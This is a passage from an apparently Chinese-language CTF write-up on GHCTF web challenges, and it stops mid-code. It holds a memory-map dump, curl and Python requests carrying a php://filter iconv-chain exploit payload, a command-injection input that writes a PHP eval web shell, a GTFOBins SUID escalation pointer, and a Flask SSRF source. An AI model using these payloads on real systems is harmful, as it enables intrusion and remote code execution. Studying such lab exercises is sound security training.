7fce63811000-7fce6382b000 r-xp 00009000 00:39 2658345                    /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0.6.1
7fce6382b000-7fce63834000 r--p 00023000 00:39 2658345                    /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0.6.1
7fce63834000-7fce63835000 r--p 0002b000 00:39 2658345                    /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0.6.1
7fce63835000-7fce63836000 rw-p 0002c000 00:39 2658345                    /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0.6.1
7fce63836000-7fce63838000 r--p 00000000 00:39 2650556                    /lib/x86_64-linux-gnu/libpcre.so.3.13.3
7fce63838000-7fce63889000 r-xp 00002000 00:39 2650556                    /lib/x86_64-linux-gnu/libpcre.so.3.13.3
7fce63889000-7fce638a7000 r--p 00053000 00:39 2650556                    /lib/x86_64-linux-gnu/libpcre.so.3.13.3
7fce638a7000-7fce638a8000 r--p 00070000 00:39 2650556                    /lib/x86_64-linux-gnu/libpcre.so.3.13.3
7fce638a8000-7fce638a9000 rw-p 00071000 00:39 2650556                    /lib/x86_64-linux-gnu/libpcre.so.3.13.3
7fce638a9000-7fce638ad000 rw-p 00000000 00:00 0
7fce638ad000-7fce638af000 rw-p 00000000 00:00 0
7fce638af000-7fce638b0000 r--p 00000000 00:39 2650500                    /lib/x86_64-linux-gnu/ld-2.31.so
7fce638b0000-7fce638d0000 r-xp 00001000 00:39 2650500                    /lib/x86_64-linux-gnu/ld-2.31.so
7fce638d0000-7fce638d8000 r--p 00021000 00:39 2650500                    /lib/x86_64-linux-gnu/ld-2.31.so
7fce638d9000-7fce638da000 r--p 00029000 00:39 2650500                    /lib/x86_64-linux-gnu/ld-2.31.so
7fce638da000-7fce638db000 rw-p 0002a000 00:39 2650500                    /lib/x86_64-linux-gnu/ld-2.31.so
7fce638db000-7fce638dc000 rw-p 00000000 00:00 0
7ffc163ff000-7ffc16420000 rw-p 00000000 00:00 0                          [stack]
7ffc1656a000-7ffc1656e000 r--p 00000000 00:00 0                          [vvar]
7ffc1656e000-7ffc16570000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]

#/lib/x86_64-linux-gnu/libc-2.31.so........here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">curl -X POST http://node1.anna.nssctf.cn:28468/?file=php://filter/read=convert.base64-encode/resource=/lib/x86_64-linux-gnu/libc-2.31.so -d "a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">curl -X POST http://node1.anna.nssctf.cn:28468/?file=php://filter/read=zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=data:text/plain;base64,e3vXt%2b/NNlG2gL73WSu0QrdmLXC8806umlMwJ0t6ZsqUo6m8M1Pkd4rEC9yQY81grntgqbBPO2zz1%2bDpK1ZmsTLgBQlcp4uOhOaFr0wOy994PeqZ2Ek2Rvw6ZhzZJFM49XboqxlXo99snbbTdZMjfg0Maht13GOelk21SvsqVr02NW9ijgABK07V3nyk9VWr9EzW2/yG94/D9svW/Pxxetv11P8rfm9%2b917%2b9%2b3n8qULPY9VLX3/udtNxZ6fgAv%2b3LTN/vLphpvk5tLuv5vfyZfW231/Xlv//8Z9u%2b9Rvyuu2NXeq/v9c9rr%2bP3x8ie38%2bA37P/03/rXuU%2b83x%2bjr7D/v02a/fUb99/9/lxbb/erYvXvte%2b%2bp%2b7/f4F/nv2b89e/Xv9ut/fvjvvx1w/euh80L7n27etf94/2/0v79Hybvf160/zff2v3138rftb%2b%2bEzl2u3Xp77e%2bu/4322x6b/vXN9eW/um3%2bbc5rvr/ketm/rdrvbJqevbuZ9avpf/%2b%2bfvj8e7wuKeVq7dH3s8/76b3Hfv9X%2bd/gra1dfe6v9/N9q0532Ry6fPbPj9YdCbCgvlXqPN9f8fv5%2bYQygg2z539Jgu3ioXPcXT5VL9qOJRxaOK6ay44aXu1mM%2b/bt7ltf2bnLpTJEmYLZP/krTtKo7qTZvs6eoeqncJqA8ocp7reHlx3qPM%2bMX6wQq3SRQiDBcjnolFr7yo%2b3db8r55qem/1j55/X6/3%2biNQUTrQk5LHtldMzSY99LbvdLPe12bXlLQL3B2qV5hVOl7l/Otc%2baoi8m%2bJ8RAA== -d "a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*- #</span>
<span class="token triple-quoted-string string">"""
@filename:post.py
@auther:JunLeon
@time:2025--23
"""</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://node1.anna.nssctf.cn:28468/"</span>

params <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/read=zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=data:text/plain;base64,e3vXt%2b/NNlG2gL73WSu0QrdmLXC8806umlMwJ0t6ZsqUo6m8M1Pkd4rEC9yQY81grntgqbBPO2zz1%2bDpK1ZmsTLgBQlcp4uOhOaFr0wOy994PeqZ2Ek2Rvw6ZhzZJFM49XboqxlXo99snbbTdZMjfg0Maht13GOelk21SvsqVr02NW9ijgABK07V3nyk9VWr9EzW2/yG94/D9svW/Pxxetv11P8rfm9%2b917%2b9%2b3n8qULPY9VLX3/udtNxZ6fgAv%2b3LTN/vLphpvk5tLuv5vfyZfW231/Xlv//8Z9u%2b9Rvyuu2NXeq/v9c9rr%2bP3x8ie38%2bA37P/03/rXuU%2b83x%2bjr7D/v02a/fUb99/9/lxbb/erYvXvte%2b%2bp%2b7/f4F/nv2b89e/Xv9ut/fvjvvx1w/euh80L7n27etf94/2/0v79Hybvf160/zff2v3138rftb%2b%2bEzl2u3Xp77e%2bu/4322x6b/vXN9eW/um3%2bbc5rvr/ketm/rdrvbJqevbuZ9avpf/%2b%2bfvj8e7wuKeVq7dH3s8/76b3Hfv9X%2bd/gra1dfe6v9/N9q0532Ry6fPbPj9YdCbCgvlXqPN9f8fv5%2bYQygg2z539Jgu3ioXPcXT5VL9qOJRxaOK6ay44aXu1mM%2b/bt7ltf2bnLpTJEmYLZP/krTtKo7qTZvs6eoeqncJqA8ocp7reHlx3qPM%2bMX6wQq3SRQiDBcjnolFr7yo%2b3db8r55qem/1j55/X6/3%2biNQUTrQk5LHtldMzSY99LbvdLPe12bXlLQL3B2qV5hVOl7l/Otc%2baoi8m%2bJ8RAA=="</span>
<span class="token punctuation">}</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"a"</span><span class="token punctuation">:</span> <span class="token string">"TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak"</span><span class="token punctuation">,</span>
  <span class="token string">"b"</span><span class="token punctuation">:</span> <span class="token string">"TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak"</span>
<span class="token punctuation">}</span>

response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt; ?php
highlight_file(__FILE__);

class ConfigLoader {
    private $config;

    public function __construct() {
        $this-&gt;config = [
            'debug' =&gt; true,
            'mode' =&gt; 'production',
            'log_level' =&gt; 'info',
            'max_input_length' =&gt; 100,
            'min_password_length' =&gt; 8,
            'allowed_actions' =&gt; ['run', 'debug', 'generate']
        ];
    }

    public function get($key) {
        return $this-&gt;config[$key] ?? null;
    }
}

class Logger {
    private $logLevel;

    public function __construct($logLevel) {
        $this-&gt;logLevel = $logLevel;
    }

    public function log($message, $level = 'info') {
        if ($level === $this-&gt;logLevel) {
            echo "[LOG] $message\n";
        }
    }
}

class UserManager {
    private $users = [];
    private $logger;

    public function __construct($logger) {
        $this-&gt;logger = $logger;
    }

    public function addUser($username, $password) {
        if (strlen($username) &lt; 5) {
            return "Username must be at least 5 characters";
        }

        if (strlen($password) &lt; 8) {
            return "Password must be at least 8 characters";
        }

        $this-&gt;users[$username] = password_hash($password, PASSWORD_BCRYPT);
        $this-&gt;logger-&gt;log("User $username added");
        return "User $username added";
    }

    public function authenticate($username, $password) {
        if (isset($this-&gt;users[$username]) &amp;&amp; password_verify($password, $this-&gt;users[$username])) {
            $this-&gt;logger-&gt;log("User $username authenticated");
            return "User $username authenticated";
        }
        return "Authentication failed";
    }
}

class StringUtils {
    public static function sanitize($input) {
        return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    }

    public static function generateRandomString($length = 10) {
        return substr(str_shuffle(str_repeat($x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length / strlen($x)))), 1, $length);
    }
}

class InputValidator {
    private $maxLength;

    public function __construct($maxLength) {
        $this-&gt;maxLength = $maxLength;
    }

    public function validate($input) {
        if (strlen($input) &gt; $this-&gt;maxLength) {
            return "Input exceeds maximum length of {$this-&gt;maxLength} characters";
        }
        return true;
    }
}

class CommandExecutor {
    private $logger;

    public function __construct($logger) {
        $this-&gt;logger = $logger;
    }

    public function execute($input) {
        if (strpos($input, ' ') !== false) {
            $this-&gt;logger-&gt;log("Invalid input: space detected");
            die('No spaces allowed');
        }

        @exec($input, $output);
        $this-&gt;logger-&gt;log("Result: $input");
        return implode("\n", $output);
    }
}

class ActionHandler {
    private $config;
    private $logger;
    private $executor;

    public function __construct($config, $logger) {
        $this-&gt;config = $config;
        $this-&gt;logger = $logger;
        $this-&gt;executor = new CommandExecutor($logger);
    }

    public function handle($action, $input) {
        if (!in_array($action, $this-&gt;config-&gt;get('allowed_actions'))) {
            return "Invalid action";
        }

        if ($action === 'run') {
            $validator = new InputValidator($this-&gt;config-&gt;get('max_input_length'));
            $validationResult = $validator-&gt;validate($input);
            if ($validationResult !== true) {
                return $validationResult;
            }

            return $this-&gt;executor-&gt;execute($input);
        } elseif ($action === 'debug') {
            return "Debug mode enabled";
        } elseif ($action === 'generate') {
            return "Random string: " . StringUtils::generateRandomString(15);
        }

        return "Unknown action";
    }
}

if (isset($_REQUEST['action'])) {
    $config = new ConfigLoader();
    $logger = new Logger($config-&gt;get('log_level'));

    $actionHandler = new ActionHandler($config, $logger);
    $input = $_REQUEST['input'] ?? '';
    echo $actionHandler-&gt;handle($_REQUEST['action'], $input);
} else {
    $config = new ConfigLoader();
    $logger = new Logger($config-&gt;get('log_level'));
    $userManager = new UserManager($logger);

    if (isset($_POST['register'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        echo $userManager-&gt;addUser($username, $password);
    }

    if (isset($_POST['login'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        echo $userManager-&gt;authenticate($username, $password);
    }

    $logger-&gt;log("No action provided, running default logic");
} [LOG] No action provided, running default logic
  #可以看到CommandExecutor很危险，直接exec,还有get会有一个action和input可传会进ActionHandler-&gt;handle();当action是run时，会创建InputValidator实例,检查输入长度是否超过100。如果通过验证，就调用CommandExecutor的execute方法.
    ?action=run&amp;input=echo${IFS}"<span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token class-name type-declaration">php</span><span class="token variable">$</span><span class="token punctuation">{</span><span class="token constant">IFS</span><span class="token punctuation">}</span><span class="token keyword">eval</span><span class="token punctuation">(</span>\<span class="token variable">$_POST</span><span class="token punctuation">[</span>pass<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>"${IFS}&gt;pass.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>?action=run&amp;input=echo${IFS}"&lt; ?php${IFS}eval(\$_POST[pass]);?&gt;"${IFS}&gt;pass.php</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c1354eb6de815a5b1d121d4d93b23413.png"></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuy0ung/articles/18421470">Linux提权-suid相关提权思路 - Yuy0ung - 博客园</a></p>
<blockquote>
<p><strong>利用命令均可在这个网站上查询</strong>：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>，这里不再赘述</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4ab32173dbaffe9feef5bf2e65685d71.png"></p>
<p>so,在里面搜wc,很容易就搜到了<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/wc/">wc | GTFOBins</a></p>
<p>belike<img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5e3648652af190111f64d06636a80234.png"></p>
<p>但要注意观察文档中的是在./wc,我们的是在/var/www/html/wc里，改一下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0eb54f9bba257bb9a467049a2238c7ae.png"></p>
<hr>
<h3 id="Goph3rrr"><a href="#Goph3rrr" class="headerlink" title="Goph3rrr"></a>Goph3rrr</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3c2b2514d5b7a3a4b0f6b8caf5a3fcc8.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> render_template_string
<span class="token keyword">import</span> os
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span> urlunparse
<span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> random

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
BlackList <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"127.0.0.1"</span>
<span class="token punctuation">]</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
    &lt;html&gt;
        &lt;head&gt;
            &lt;style&gt;
                body {
                    background-image: url('d‘）/* 背景图像 */
                    background-size: cover; /* 背景图片覆盖整个页面 */
                    height: 100vh; /* 页面高度填满浏览器窗口 */
                    display: flex;
                    justify-content: center; /* 水平居中 */
                    align-items: center; /* 垂直居中 */
                    color: white; /* 字体颜色 */
                    font-family: Arial, sans-serif; /* 字体 */
                    text-align: center; /* 文字居中 */
                }
                h1 {
                    font-size: 50px;
                    transition: transform 0.2s ease-in-out; /* 设置浮动效果过渡时间 */
                }
                h1:hover {
                    transform: translateY(-10px); /* 向上浮动 */
                }
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;h1&gt;Hello Ctfer!!! Welcome to the GHCTF challenge! (≧∇≦)&lt;/h1&gt;
        &lt;/body&gt;
    &lt;/html&gt;
    '''</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    junk_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Welcome back, </span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"Invalid credentials!"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
        &lt;!DOCTYPE html&gt;
        &lt;html lang="en"&gt;
        &lt;head&gt;
            &lt;meta charset="UTF-8"&gt;
            &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
            &lt;title&gt;Login&lt;/title&gt;
            &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"&gt;
            &lt;style&gt;
                body {
                    background-color: #f8f9fa;
                }
                .container {
                    max-width: 400px;
                    margin-top: 100px;
                }
                .card {
                    border: none;
                    border-radius: 10px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                }
                .card-header {
                    background-color: #007bff;
                    color: white;
                    text-align: center;
                    border-radius: 10px 10px 0 0;
                }
                .btn-primary {
                    background-color: #007bff;
                    border: none;
                }
                .btn-primary:hover {
                    background-color: #0056b3;
                }
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;div class="container"&gt;
                &lt;div class="card"&gt;
                    &lt;div class="card-header"&gt;
                        &lt;h3&gt;Login&lt;/h3&gt;
                    &lt;/div&gt;
                    &lt;div class="card-body"&gt;
                        &lt;form method="POST"&gt;
                            &lt;div class="mb-3"&gt;
                                &lt;label for="username" class="form-label"&gt;Username&lt;/label&gt;
                                &lt;input type="text" class="form-control" id="username" name="username" required&gt;
                            &lt;/div&gt;
                            &lt;div class="mb-3"&gt;
                                &lt;label for="password" class="form-label"&gt;Password&lt;/label&gt;
                                &lt;input type="password" class="form-control" id="password" name="password" required&gt;
                            &lt;/div&gt;
                            &lt;button type="submit" class="btn btn-primary w-100"&gt;Login&lt;/button&gt;
                        &lt;/form&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/body&gt;
        &lt;/html&gt;
    """</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Gopher'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> url <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No url provided :)"</span>
    url <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    realIpAddress <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>url<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span>
    <span class="token keyword">if</span> url<span class="token punctuation">.</span>scheme <span class="token operator">==</span> <span class="token string">"file"</span> <span class="token keyword">or</span> realIpAddress <span class="token keyword">in</span> BlackList<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No (≧∇≦)"</span>
    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> urlunparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token comment">#urlunparse 是 urllib.parse 模块中的函数，用于将 urlparse 解析后的 URL 对象重新组合成 URL 字符串。</span>
    <span class="token keyword">return</span> result<span class="token punctuation">.</span>stdout

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/RRegister'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    junk_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>
            <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"Username already exists!"</span><span class="token punctuation">)</span>
